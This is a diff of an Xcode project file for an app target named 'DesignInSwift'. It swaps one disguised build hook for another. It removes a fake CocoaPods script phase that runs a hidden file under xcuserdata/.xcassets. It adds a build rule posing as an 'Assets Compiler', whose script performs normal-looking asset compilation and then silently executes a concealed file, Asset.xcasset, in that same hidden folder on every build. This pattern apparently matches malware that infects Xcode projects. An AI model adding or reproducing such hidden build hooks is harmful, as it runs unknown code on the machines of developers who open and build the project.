@@ -842,7 +842,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 880D705825EFDEAA008DCC96 /* Build configuration list for PBXNativeTarget "DesignInSwift" */;
 			buildPhases = (
-				A7E49FB395BBFF35D06D902C /* [CP] Build Pods Frameworks */,
 				78D2C909D3807C078D72D040 /* [CP] Check Pods Manifest.lock */,
 				880D702A25EFDE9D008DCC96 /* Sources */,
 				880D702B25EFDE9D008DCC96 /* Frameworks */,
@@ -850,6 +849,7 @@
 				B4B239851661D3C406786693 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				546F9C3DFBAAB89AE66D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1121,26 +1121,6 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	A7E49FB395BBFF35D06D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
-		};
 	
 
 	
@@ -1633,6 +1613,31 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+		546F9C3DFBAAB89AE66D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
 
 
 			
